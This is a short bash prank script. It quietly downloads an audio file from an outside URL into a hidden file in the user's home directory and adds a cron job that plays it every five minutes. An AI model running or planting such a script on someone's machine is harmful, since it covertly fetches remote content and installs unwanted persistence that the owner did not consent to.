#!/bin/bash

# Downloand and hide the file
curl -s http://0.s3.envato.com/files/17833436/preview.mp3 > ~/.laughs.mp3

# New cron job every 5 minutes
cmd="*/5 * * * * afplay ~/.laughs.mp3 # u mad bro?";

# Adding the new job
(crontab -e; echo "$cmd") | crontab -
